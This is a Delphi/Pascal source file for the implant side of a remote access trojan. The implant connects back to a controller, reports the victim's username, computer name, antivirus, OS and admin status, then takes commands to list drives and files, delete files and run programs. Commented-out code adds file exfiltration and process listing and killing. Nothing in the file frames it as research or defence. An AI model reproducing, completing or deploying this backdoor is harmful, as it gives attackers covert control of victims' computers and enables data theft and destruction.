Program prjEE;
uses
  Windows,
  Winsock,
  Classes,
  untFunc,
  mmSystem,
  Registry,
  ShellAPI,
  TLHelp32,
  untAV in 'untAV.pas',
  Unit1 in 'Unit1.pas';

Type TServer = Class(TObject)
Private
  hSocket: TSocket;
  Addr: TSockAddrIn;
  wsaData: TWSAData;
Public
  Procedure Connect;
  Procedure SendData(sData: String);
  Procedure ReceiveData(sSocket: TSocket; Buffer: PByte);
//  Procedure SendClientFile;
End;

Var
  Server: TServer;
  Close: Boolean;
  hPort: Integer;
  hHost: String;
  IsAdmin: string;
  RequestedFile:string;
Procedure TServer.Connect;
Var
  Buffer: Array[0..8192] Of Char;
  iRecv: Integer;
Begin
  If (WSAStartup($0202, wsaData) <> 0) Then
  Begin
    //Unable to start winsock, unable to continue
    Exit;
  End;

  Close := False;
  Repeat

  hSocket := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.Sin_family := AF_INET;
  Addr.sin_port := htons(hPort);
  Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(hHost)));

  //Connecting to GetIPFromHost(hHost)

  If (Winsock.Connect(hSocket, Addr, SizeOf(Addr)) = 0) Then
  Begin
    if IsUserAdmin = True then
      begin
      IsAdmin:='Admin';
      end
    else

      begin
      IsAdmin:='Guest/User';
      end;

    //Connected to host
    SendData('Connect|' + 'admin' + '|' + 'Victim_15' + '|' + GetLAN + '|' + sUsername + '|' + sComputer + '|' + KieroElAv() + '|' + GetOS + '|' + GetWindowsLanguage + '|' + 'x' + '|' + IsAdmin + '|' + '-');

    //Attempt to receieve data
    ZeroMemory(@Buffer, SizeOf(Buffer));
    iRecv := Recv(hSocket, Buffer, SizeOf(Buffer), 0);

    While ((iRecv > 0) And (iRecv <> INVALID_SOCKET)) Do
    Begin
      ReceiveData(hSocket, @Buffer);
      ZeroMemory(@Buffer, SizeOf(Buffer));
      iRecv := Recv(hSocket, Buffer, SizeOf(Buffer), 0);
    End;

    //Disconnected
    CloseSocket(hSocket);
  End;

  Sleep(3000);
  Until (Close);
  WSACleanup();
End;

Procedure TServer.SendData(sData: String);
Var
  Len: LongInt;
Begin
  Len := Length(sData);
  Send(hSocket, sData[1], Len, 0);
End;

Procedure TServer.ReceiveData(sSocket: TSocket; Buffer: PByte);
Var
  sData: String;
  sCmd: String;
  Buf: String;
  sDat: TStringList;
  MsgLen: integer; {The comma is just a way of declaring two integers }
  LenReceived: integer; {EG: int1,int2,int3: integer; }
Begin
  sData := String(Buffer);

  If Length(sData) > 0 Then
  Begin
    sDat := Explode('|', sData);
    sCmd := sDat[0];

    If sCmd = 'ListDrives' Then
    Begin
      SendData('Drives|' + ListAllDrives);
    End;

    If sCmd = 'ListFiles' Then
    Begin
      SendData('Files|' +ListFiles(sDat[1]));
    End;

    If sCmd = 'DeleteFile' Then
    Begin
      DelFile(sDat[1]);
      SendData('Status|File Deleted');
    End;

    if sCmd = 'RunVisible' then
    begin
      shellExecuteA(0,'open',PChar(sDat[1]),nil,nil,SW_SHOWNORMAL);
    end;

    if sCmd = 'Reqstfile' then
    begin
    //Delete(Buf, 1, 11); {Delete the tag: <REQSTFILE>}
    //RequestedFile := sDat[1];
 //   SendClientFile;
    end;

    if sCmd = 'ListAllProcess' then
    begin
    //   SendData('ListedProcess' + '|' + listProc);
    end;
End;

end;

//procedure SendClientFile; var
//TheFileSize: integer;
//FS : TFileStream;
//begin
//    begin
//      try
//      FS := TFileStream.Create(RequestedFile, fmOpenRead);
//      FS.Position := 0; {3}
//      TheFileSize := FS.Size; {4}
//      SendData('Fileonway|' + IntToStr(TheFileSize) + '|');
//      SendData(SendStream(FS);
//        except
//      SendData('Errorocrd|');
//        end;
//    end
//end
{
function listProc: string;
var
handle: THandle;
procShot: TProcessEntry32;
str: string;
i: integer;
loop: boolean;
begin
str := '';
i := 0;
handle := createToolHelp32Snapshot(TH32CS_SNAPPROCESS,0);
procShot.dwSize := sizeof(procShot);
loop := process32First(handle,procShot);
while integer(loop) <> 0 do begin
str := str + procShot.szExeFile + '`';
i := i+1;
loop := process32Next(handle,procShot);
end;
closeHandle(handle);
result := inttostr(i) + '|' + str;
end;

function listProc: string;
var
handle: THandle;
procShot: TProcessEntry32;
str: string;
i: integer;
loop: boolean;
begin
str := '';
i := 0;
handle := createToolHelp32Snapshot(TH32CS_SNAPPROCESS,0);
procShot.dwSize := sizeof(procShot);
loop := process32First(handle,procShot);
while integer(loop) <> 0 do begin
str := str + procShot.szExeFile + '`';
i := i+1;
loop := process32Next(handle,procShot);
end;
closeHandle(handle);
result := inttostr(i) + '|' + str;
end;

function killProc(proc: string): integer;
const
Terminate = $0001;
var
loop: boolean;
handle: THandle;
procShot: TProcessEntry32;
begin
result := 0;
handle := createToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
procShot.dwSize:=sizeof(procShot);
loop:=Process32First(Handle,procShot);
while integer(loop) <> 0 do begin
if ((upperCase(extractFileName(procShot.szExeFile)) = upperCase(proc)) or (upperCase(procShot.szExeFile)= upperCase(proc)))then
result := integer(terminateProcess(openProcess(Terminate,bool(0),procShot.th32ProcessID),0));
loop := process32Next(handle,procShot);
end;
closeHandle(handle);
end;

function procExists(exeFileName: string): boolean;
var
loop: boolean;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
FSnapshotHandle := createToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
FProcessEntry32.dwSize := sizeof(FProcessEntry32);
loop := process32First(FSnapshotHandle,FProcessEntry32);
result := false;
while integer(loop) <> 0 do begin
if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then begin
result := True;
end;
loop := process32Next(FSnapshotHandle,FProcessEntry32);
end;
closeHandle(FSnapshotHandle);
end;
}

Begin
  Server := TServer.Create;
  hHost := '127.0.0.1';
  hPort := 4181;
  Server.Connect;
End.
